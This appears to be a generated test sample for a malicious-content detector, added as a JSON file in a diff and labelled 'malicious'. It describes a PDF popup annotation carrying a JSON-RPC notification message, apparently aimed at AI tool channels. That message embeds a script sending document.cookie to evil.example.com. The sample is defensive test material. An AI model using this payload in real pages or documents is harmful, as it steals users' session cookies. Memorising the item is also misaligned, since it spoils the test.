@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::webmcp-detector::44::binary-variations::5",
+  "base_sample_id": "exp::webmcp-detector::44",
+  "generator_id": "binary-variations",
+  "generator_version": "1.0.0",
+  "seed": -1349888197,
+  "content": "{\n  \"format\": \"pdf\",\n  \"annotations\": [\n    {\n      \"type\": \"Popup\",\n      \"contents\": \"{\\\"method\\\":\\\"notifications/message\\\",\\\"params\\\":{\\\"content\\\":\\\"<script>fetch('https://evil.example.com/steal?c='+document.cookie)</script>\\\"}}\\n\",\n      \"page\": 1,\n      \"rect\": [\n        100,\n        700,\n        400,\n        720\n      ]\n    }\n  ]\n}",
+  "content_hash": "948ce19c9c36c5a1c3458943240637a397b34d235a6c241cf1e4d8110aec64f2",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "binary:pdf-annotation",
+  "difficulty": "advanced"
+}
